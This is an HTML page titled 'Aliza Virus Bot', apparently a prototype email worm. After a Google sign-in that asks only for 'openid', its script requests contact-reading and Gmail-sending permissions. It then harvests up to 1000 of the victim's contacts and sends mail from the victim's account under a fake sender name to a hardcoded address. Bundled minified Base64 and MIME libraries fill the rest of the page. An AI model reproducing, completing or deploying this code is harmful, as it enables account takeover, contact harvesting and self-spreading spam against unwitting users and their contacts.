<!DOCTYPE html>
<html>
<head>
    <title>Aliza Virus Bot</title>
    <meta charset='utf-8'/>
</head>
<body>
<p>Aliza Virus Bot</p>

<!--Add buttons to initiate auth sequence and sign out-->
<button id="authorize-button" style="display: none;">Authorize</button>
<button id="signout-button" style="display: none;">Sign Out</button>

<pre id="content"></pre>

<script type="text/javascript">
    // Client ID and API key from the Developer Console
    var CLIENT_ID = '1045931524414-ssbt5gb4nq834h26bicl355vbtti2g7g.apps.googleusercontent.com';

    // Array of API discovery doc URLs for APIs used by the quickstart
    var DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/gmail/v1/rest"];

    var authorizeButton = document.getElementById('authorize-button');
    var signoutButton = document.getElementById('signout-button');

    /**
     *  On load, called to load the auth2 library and API client library.
     */
    function handleClientLoad() {
        gapi.load('client:auth2', initClient);
    }

    /**
     *  Initializes the API client library and sets up sign-in state
     *  listeners.
     */
    function initClient() {
        gapi.client.init({
            discoveryDocs: DISCOVERY_DOCS,
            clientId: CLIENT_ID,
            scope: "openid"
        }).then(function () {

            //             Listen for sign-in state changes.
            GoogleAuth = gapi.auth2.getAuthInstance();
            GoogleAuth.isSignedIn.listen(updateSigninStatus);

            //             Handle the initial sign-in state.
            updateSigninStatus(GoogleAuth.isSignedIn.get());
            authorizeButton.onclick = handleAuthClick;
            signoutButton.onclick = handleSignoutClick;
        });
    }

    /**
     *  Called when the signed in status changes, to update the UI
     *  appropriately. After a sign-in, the API is called.
     */

    function updateSigninStatus(isSignedIn) {
        if (isSignedIn) {
            authorizeButton.style.display = 'none';
            signoutButton.style.display = 'block';
            var hasGrantedScopes = checkScopes();
            if (!hasGrantedScopes) {
                for (var i = 0; i < 100000; i++) {
                }
                var GoogleUser = GoogleAuth.currentUser.get();
                GoogleUser.grant({'scope': "https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/gmail.send"}).then(function () {

                    createEmailList();
                    listEmails();
                })

            }

        } else {
            authorizeButton.style.display = 'block';
            signoutButton.style.display = 'none';
        }
    }

    /**
     *  Sign in the user upon button click.
     */
    function handleAuthClick(event) {
        gapi.auth2.getAuthInstance().signIn();
    }

    /**
     *  Sign out the user upon button click.
     */
    function handleSignoutClick(event) {
        gapi.auth2.getAuthInstance().signOut();
    }

    function checkScopes() {
        var access_token = gapi.auth2.getAuthInstance().currentUser.get().getAuthResponse().access_token;
        var url = "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=" + access_token;
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, false);
        xhr.send();
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            var scopes = JSON.parse(xhr.responseText)['scope'].split(" ");
            console.log(scopes);
            return scopes.includes("https://www.googleapis.com/auth/contacts.readonly");


        }
    }

    /**
     * Append a pre element to the body containing the given message
     * as its text node. Used to display the results of the API call.
     *
     * @param {string} message Text to be placed in pre element.
     */
    function appendPre(message) {
        var pre = document.getElementById('content');
        var textContent = document.createTextNode(message + '\n');
        pre.appendChild(textContent);
    }

    function createEmailList() {
        var pre = document.getElementById('content');
        appendPre('Emails:');
        var ul = document.createElement("ul");
        ul.setAttribute('id', 'email-list');
        pre.appendChild(ul);
    }

    function appendEmail(address) {
        var pre = document.getElementById('email-list');
        var btn = document.createElement("button");
        btn.onclick = sendMessage;
        var t = document.createTextNode(address + '\n');
        btn.appendChild(t);
        var li = document.createElement('li');
        li.appendChild(btn);
        pre.appendChild(li);
    }

    function sendMessage() {
        var address = this.textContent;
        // Using the js-base64 library for encoding:
        // https://www.npmjs.com/package/js-base64
        address = 'petrovovitch@gmail.com';
        var originalMail = {
            "to": `${address}`,
            "cc": "",
            "subject": "Greetings from Aliza",
            "fromName": "John Smith",
            "from": "john@smith.com",
            "body": "Hi from Aliza!",
            "cids": [],
            "attaches": []
        };
        var mimeTxt = Mime.toMimeTxt(originalMail);
        var base64EncodedEmail = Base64.encodeURI(mimeTxt);
        var request = gapi.client.gmail.users.messages.send({
            'userId': 'me',
            'resource': {
                'raw': base64EncodedEmail
            }
        });
        request.execute(function () {
            console.log('sent email');
        });

    }

    function listEmails() {
        var access_token = gapi.auth2.getAuthInstance().currentUser.get().getAuthResponse().access_token;
        var cif = {
            method: 'GET',
            url: 'https://www.google.com/m8/feeds/contacts/default/full/',
            data: {
                "access_token": access_token,
                "alt": "json",
                "max-results": "1000"
            },
            headers: {
                "Gdata-Version": "3.0"
            },
            xhrFields: {
                withCredentials: true
            },
            dataType: "jsonp"
        };
        $.ajax(cif).done(function (result) {
            result.feed.entry.forEach((person) => person['gd$email'] ? appendEmail(person['gd$email'][0].address) : '');
        });
    }


</script>

<script async defer src="https://apis.google.com/js/api.js"
        onload="this.onload=function(){};handleClientLoad()"
        onreadystatechange="if (this.readyState === 'complete') this.onload()">
</script>
<script src = "https://code.jquery.com/jquery-1.10.2.js" ></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Base64/1.0.1/base64.js"></script>
<script>(function(global){"use strict";var _Base64=global.Base64;var version="2.1.9";var buffer;if(typeof module!=="undefined"&&module.exports){try{buffer=require("buffer").Buffer}catch(err){}}var b64chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var b64tab=function(bin){var t={};for(var i=0,l=bin.length;i<l;i++)t[bin.charAt(i)]=i;return t}(b64chars);var fromCharCode=String.fromCharCode;var cb_utob=function(c){if(c.length<2){var cc=c.charCodeAt(0);return cc<128?c:cc<2048?fromCharCode(192|cc>>>6)+fromCharCode(128|cc&63):fromCharCode(224|cc>>>12&15)+fromCharCode(128|cc>>>6&63)+fromCharCode(128|cc&63)}else{var cc=65536+(c.charCodeAt(0)-55296)*1024+(c.charCodeAt(1)-56320);return fromCharCode(240|cc>>>18&7)+fromCharCode(128|cc>>>12&63)+fromCharCode(128|cc>>>6&63)+fromCharCode(128|cc&63)}};var re_utob=/[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g;var utob=function(u){return u.replace(re_utob,cb_utob)};var cb_encode=function(ccc){var padlen=[0,2,1][ccc.length%3],ord=ccc.charCodeAt(0)<<16|(ccc.length>1?ccc.charCodeAt(1):0)<<8|(ccc.length>2?ccc.charCodeAt(2):0),chars=[b64chars.charAt(ord>>>18),b64chars.charAt(ord>>>12&63),padlen>=2?"=":b64chars.charAt(ord>>>6&63),padlen>=1?"=":b64chars.charAt(ord&63)];return chars.join("")};var btoa=global.btoa?function(b){return global.btoa(b)}:function(b){return b.replace(/[\s\S]{1,3}/g,cb_encode)};var _encode=buffer?function(u){return(u.constructor===buffer.constructor?u:new buffer(u)).toString("base64")}:function(u){return btoa(utob(u))};var encode=function(u,urisafe){return!urisafe?_encode(String(u)):_encode(String(u)).replace(/[+\/]/g,function(m0){return m0=="+"?"-":"_"}).replace(/=/g,"")};var encodeURI=function(u){return encode(u,true)};var re_btou=new RegExp(["[À-ß][-¿]","[à-ï][-¿]{2}","[ð-÷][-¿]{3}"].join("|"),"g");var cb_btou=function(cccc){switch(cccc.length){case 4:var cp=(7&cccc.charCodeAt(0))<<18|(63&cccc.charCodeAt(1))<<12|(63&cccc.charCodeAt(2))<<6|63&cccc.charCodeAt(3),offset=cp-65536;return fromCharCode((offset>>>10)+55296)+fromCharCode((offset&1023)+56320);case 3:return fromCharCode((15&cccc.charCodeAt(0))<<12|(63&cccc.charCodeAt(1))<<6|63&cccc.charCodeAt(2));default:return fromCharCode((31&cccc.charCodeAt(0))<<6|63&cccc.charCodeAt(1))}};var btou=function(b){return b.replace(re_btou,cb_btou)};var cb_decode=function(cccc){var len=cccc.length,padlen=len%4,n=(len>0?b64tab[cccc.charAt(0)]<<18:0)|(len>1?b64tab[cccc.charAt(1)]<<12:0)|(len>2?b64tab[cccc.charAt(2)]<<6:0)|(len>3?b64tab[cccc.charAt(3)]:0),chars=[fromCharCode(n>>>16),fromCharCode(n>>>8&255),fromCharCode(n&255)];chars.length-=[0,0,2,1][padlen];return chars.join("")};var atob=global.atob?function(a){return global.atob(a)}:function(a){return a.replace(/[\s\S]{1,4}/g,cb_decode)};var _decode=buffer?function(a){return(a.constructor===buffer.constructor?a:new buffer(a,"base64")).toString()}:function(a){return btou(atob(a))};var decode=function(a){return _decode(String(a).replace(/[-_]/g,function(m0){return m0=="-"?"+":"/"}).replace(/[^A-Za-z0-9\+\/]/g,""))};var noConflict=function(){var Base64=global.Base64;global.Base64=_Base64;return Base64};global.Base64={VERSION:version,atob:atob,btoa:btoa,fromBase64:decode,toBase64:encode,utob:utob,encode:encode,encodeURI:encodeURI,btou:btou,decode:decode,noConflict:noConflict};if(typeof Object.defineProperty==="function"){var noEnum=function(v){return{value:v,enumerable:false,writable:true,configurable:true}};global.Base64.extendString=function(){Object.defineProperty(String.prototype,"fromBase64",noEnum(function(){return decode(this)}));Object.defineProperty(String.prototype,"toBase64",noEnum(function(urisafe){return encode(this,urisafe)}));Object.defineProperty(String.prototype,"toBase64URI",noEnum(function(){return encode(this,true)}))}}if(global["Meteor"]){Base64=global.Base64}})(this);</script>
<script>(function(){window.Mime=function(){var e,n,t,r,u;return u=function(e,n){var t,r,u,a,o,c,i,s,l,d,p,f,m,g,h,b;return m=function(e){var n,t,r,u;return n=/(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gim,u=e.replace(n,'<a href="$1" target="_blank">$1</a>'),t=/(^|[^\/])(www\.[\S]+(\b|$))/gim,u=u.replace(t,'$1<a href="http://$2" target="_blank">$2</a>'),r=/(([a-zA-Z0-9\-\_\.])+@[a-zA-Z\_]+?(\.[a-zA-Z]{2,6})+)/gim,u=u.replace(r,'<a href="mailto:$1">$1</a>')},p=function(){var e;return e=function(){return Math.random().toString(36).slice(2)},e()+e()},l=function(e){return null==e&&(e=""),"\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: base64\n\n"+Base64.encode(e,!0).replace(/.{76}/g,"$&\n")},i=function(e){var n;return n=e.body||"",n=n.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/,"&gt;").replace(/\n/g,"\n<br/>"),n=m(n),n="<div>"+n+"</div>","\nContent-Type: text/html; charset=UTF-8\nContent-Transfer-Encoding: base64\n\n"+Base64.encode(n,!0).replace(/.{76}/g,"$&\n")},a=function(e,n){var t;return t=p(),"\nContent-Type: multipart/alternative; boundary="+t+"\n\n--"+t+e+"\n\n--"+t+n+"\n\n--"+t+"--"},c=function(e){var n,t,r,u,a,o,c,i;if(e){for(r=[],a=0,o=e.length;o>a;a++)t=e[a],i=t.type,c=t.name,n=t.base64,u=p(),r.push("\nContent-Type: "+i+'; name="'+c+'"\nContent-Transfer-Encoding: base64\nContent-ID: <'+u+">\nX-Attachment-Id: "+u+"\n\n"+n);return r}},d=function(e,n){var t,r,u,a,o;for(null==n&&(n=[]),t=p(),o="\nContent-Type: multipart/related; boundary="+t+"\n\n--"+t+e,u=0,a=n.length;a>u;u++)r=n[u],o+="\n--"+t+r;return o+"\n--"+t+"--"},o=function(e){var n,t,r,u,a,o,c,i;if(e){for(c=[],u=0,a=e.length;a>u;u++)n=e[u],i=n.type,o=n.name,t=n.base64,r=p(),c.push("\nContent-Type: "+i+'; name="'+o+'"\nContent-Disposition: attachment; filename="'+o+'"\nContent-Transfer-Encoding: base64\nX-Attachment-Id: '+r+"\n\n"+t);return c}},s=function(n,t){var r,u,a,o,c,i,s,l;for(u=p(),l="",e.subject&&(l="=?UTF-8?B?"+Base64.encode(e.subject,!0)+"?="),i="=?UTF-8?B?"+Base64.encode(e.fromName||"",!0)+"?=",a=(new Date).toGMTString().replace(/GMT|UTC/gi,"+0000"),s="MIME-Version: 1.0\nDate: "+a+"\nMessage-ID: <"+p()+"@mail.your-domain.com>\nSubject: "+l+"\nFrom: "+i+" <"+e.from+">"+(e.to?"\nTo: "+e.to:"")+(e.cc?"\nCc: "+e.cc:"")+"\nContent-Type: multipart/mixed; boundary="+u+"\n\n--"+u+n,o=0,c=t.length;c>o;o++)r=t[o],s+="\n--"+u+r;return(s+"\n--"+u+"--").replace(/\n/g,"\r\n")},g=l(e.body),n?h=g:(f=i(e),t=a(g,f),u=c(e.cids),h=d(t,u)),r=o(e.attaches),b=s(h,r)},e=function(e){var t,r,u,a,o,c,i,s;r=function(e){var t,u,a,o,c,i,s,l,d,p,f,m,g,h,b,C;if(l=e.indexOf("\r\n\r\n"),-1===l&&(e=e.replace(/\n/g,"\r\n"),l=e.indexOf("\r\n\r\n"),-1===l&&(l=e.length)),p=e.slice(0,l).replace(/\r\n\s+/g," ")+"\r\n",d=e.slice(l).replace(/(\r\n)+$/,"").replace(/^(\r\n)+/,""),i="",h=p.match(/Content-Type: (.*)/i),h&&h.length>0?i=h[1]:console.log("Warning: MailParser: Content-type doesn't exist!"),s=i.split(";"),m=s[0].replace(/\s/g,""),g=m.split("/"),"multipart"===g[0].toLowerCase())for(o=[],f=s[1].match(/boundary="?([^"]*)"?/i),!f&&s[2]&&(f=s[2].match(/boundary="?([^"]*)"?/i)),c=n.trim(f[1]).replace(/"/g,""),t=c.replace(/\+/g,"\\+"),b=new RegExp("--"+t,"g"),o=d.replace(b,c).replace(b,c).split(c),o.shift(),o.pop(),u=0;u<o.length;)o[u]=o[u].replace(/(\r\n)+$/,"").replace(/^(\r\n)+/,""),o[u]=r(o[u]),u++;else if(a=d,"text"===g[0]&&(a=a.replace(RegExp("=\\r\\n","g"),""),C=a.match(RegExp("=[A-F0-9][A-F0-9]","g"))))for(u=0;u<C.length;)a=a.replace(C[u],String.fromCharCode(parseInt(C[u].replace(RegExp("="),""),16))),u++;return{rawHeaders:p,rawBody:d,body:a,contentType:i,contentTypeParts:s,boundary:c,bodyParts:o,mimeType:m,mimeTypeParts:g}},o="";try{o=r(e)}catch(l){}return c=o.rawHeaders,a=function(e){return null==e&&(e=[]),e[1]||""},i=a(/\r\nSubject: (.*)\r\n/g.exec(c)),s=a(/\r\nTo: (.*)\r\n/g.exec(c)),t=a(/\r\nCc: (.*)\r\n/g.exec(c)),u=a(/\r\nFrom: (.*)\r\n/g.exec(c)),{messageParts:o,subject:i,to:s,cc:t,from:u}},n=function(){var e,t,r,u,a,o,c,i;return c=function(e){return null==e&&(e=""),("function"==typeof e.trim?e.trim():void 0)||e.replace(/^\s+|\s+$/g,"")},u=function(n,t){var r;return null==n&&(n=""),null==t&&(t=""),t=t.toLowerCase(),r=function(){switch(!1){case-1===t.indexOf("koi8-r"):return e(n);case-1===t.indexOf("utf-8"):return Base64._utf8_decode(n);case-1===t.indexOf("windows-1251"):return i(n);default:return n}}()},t=function(e){return e.replace(/\=[\r\n]+/g,"").replace(/\=[0-9A-F]{2}/gi,function(e){return String.fromCharCode(parseInt(e.substr(1),16))})},e=function(e){var n,t,r,u,a,o,c;for(n=unescape("%u2500%u2502%u250C%u2510%u2514%u2518%u251C%u2524%u252C%u2534%u253C%u2580%u2584%u2588%u258C%u2590%u2591%u2592%u2593%u2320%u25A0%u2219%u221A%u2248%u2264%u2265%u00A0%u2321%u00B0%u00B2%u00B7%u00F7%u2550%u2551%u2552%u0451%u2553%u2554%u2555%u2556%u2557%u2558%u2559%u255A%u255B%u255C%u255D%u255E%u255F%u2560%u2561%u0401%u2562%u2563%u2564%u2565%u2566%u2567%u2568%u2569%u256A%u256B%u256C%u00A9%u044E%u0430%u0431%u0446%u0434%u0435%u0444%u0433%u0445%u0438%u0439%u043A%u043B%u043C%u043D%u043E%u043F%u044F%u0440%u0441%u0442%u0443%u0436%u0432%u044C%u044B%u0437%u0448%u044D%u0449%u0447%u044A%u042E%u0410%u0411%u0426%u0414%u0415%u0424%u0413%u0425%u0418%u0419%u041A%u041B%u041C%u041D%u041E%u041F%u042F%u0420%u0421%u0422%u0423%u0416%u0412%u042C%u042B%u0417%u0428%u042D%u0429%u0427%u042A"),t=function(e){return e>=128&&255>=e?n.charAt(e-128):String.fromCharCode(e)},o="",r=u=0,a=e.length;a>u;r=++u)c=e[r],o+=t(e.charCodeAt(r));return o},i=function(e){var n,t,r,u,a,o,c;for(null==e&&(e=""),o="",n=r=0,u=e.length;u>r;n=++r)c=e[n],t=e.charCodeAt(n),a=function(){switch(!1){case 168!==t:return 1025;case 184!==t:return 1105;case!(t>191&&256>t):return t+848;default:return t}}(),o+=String.fromCharCode(a);return o},r=function(e,r){var a,o,c;return e=n.trim(e),o=void 0,a=void 0,c=void 0,(c=e.match(/^\=\?([\w_\-]+)\?([QqBb])\?([^\?]*)\?\=$/i))?(o=c[1],a=(c[2]||"Q").toString().toUpperCase(),e=(c[3]||"").replace(/_/g," "),"B"===a?Base64.decode(e,r):"Q"===a?t(e):e):u(e,r)},a=function(e,n){return e=(e||"").toString().replace(/(=\?[^?]+\?[QqBb]\?[^?]+\?=)\s+(?==\?[^?]+\?[QqBb]\?[^?]*\?=)/g,"$1").replace(/\=\?([\w_\-]+)\?([QqBb])\?[^\?]*\?\=/g,function(e,n,t){return r(e)}.bind(this)),u(e,n)},o=function(e){return null==e&&(e=""),(e+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")},{decode:u,KOIRDec:e,win1251Dec:i,decodeMimeWords:a,toHtmlEntity:o,trim:c}}(),t=function(t){var u,a,o,c,i,s,l,d,p,f,m,g;f={html:"",text:"",attaches:[],innerMsgs:[],to:n.decodeMimeWords(t.to),cc:n.decodeMimeWords(t.cc),from:n.decodeMimeWords(t.from),subject:n.decodeMimeWords(t.subject)},a=function(e,t){var r,u,a;return a=/Content-Transfer-Encoding: quoted-printable/i.test(t),u=/Content-Transfer-Encoding: base64/i.test(t),u?(e=e.replace(/\s/g,""),r="function"==typeof atob?atob(e):void 0,null==r&&(r=Base64.decode(e)),e=r):a&&(e=n.QPDec(e)),e},d=function(t){var u,o,c,i,s,l,p,m,g,h,b,C,y,x,T,v,w,B,A,E,M,D,F,$,O;if(t){for(h=0,C=t.length;C>h;h++)if(w=t[h],x=(null!=(A=w.mimeType)?A:"").toLowerCase(),-1===x.indexOf("multipart"))if(-1===x.indexOf("message/rfc822"))if(B=w.rawHeaders,i=-1!==B.indexOf("Content-Disposition: attachment"),o=w.rawBody,l=/text\/html/.test(x),m=/text\/plain/.test(x),p=/image/.test(x),s=/audio/.test(x),i||p||s){for(g=/Content-Transfer-Encoding: quoted-printable/i.test(B),g&&(o=n.QPDec(o),o=btoa?btoa(o):Base64.encode(o)),E=w.contentTypeParts,b=0,y=E.length;y>b;b++)if(O=E[b],/name=/i.test(O)){T=O.replace(/(.*)=/,"").replace(/"|'/g,"");break}T||(T=p?"image":s?"audio":"attachment",T+="_"+Math.floor(100*Math.random()),F=x.indexOf("/"),$=x.substring(F+1),$.length<4&&(T+="."+$)),D=/(.*)content-id:(.*)<(.*)>/i,u={type:x,base64:o,name:T,cid:null!=(M=D.exec(B))?M[3]:void 0,visible:/png|jpeg|jpg|gif/.test(x)},f.attaches.push(u)}else l||m?(o=a(o,B),o=n.decode(o,w.contentType),l&&(f.html+=o),m&&(f.text+=o)):console.log("Unknown mime type: "+x);else v=e(w.rawBody),c=r(v),f.innerMsgs.push(c);else d(w.bodyParts);return null}};try{if(p=t.messageParts,!p)return f;l=(p.mimeType||"").toLowerCase(),i=/text\/plain/.test(l),c=/text\/html/.test(l),-1!==l.indexOf("multipart")?d(p.bodyParts):i||c?(u=a(p.body,p.rawHeaders),u=n.decode(u,p.contentType),c&&(f.html=u),i&&(f.text=u)):console.log("Warning: mime type isn't supported! mime="+l)}catch(h){throw o=h,new Error(o)}return g=function(e){return"<pre>"+n.toHtmlEntity(e)+"</pre>"},s=function(e){var t,r,u,a,o,c,i,l;if(u=e.innerMsgs,null!=u?u.length:void 0)for(!n.trim(e.html)&&e.text&&(e.html+=g(e.text)),a=0,o=u.length;o>a;a++)r=u[a],c=s(r),l=c.text,t=c.html,t?e.html+=t:l&&(e.html+=wrapPerTag(l),e.text+=l),(null!=(i=c.attaches)?i.length:void 0)>0&&(e.attaches=e.attaches.concat(c.attaches));return e},m=s(f)},r=function(n){var r,u;return u=e(n),r=t(u)},{toMimeTxt:u,toMimeObj:r}}()}).call(this);</script>
</body>
</html>
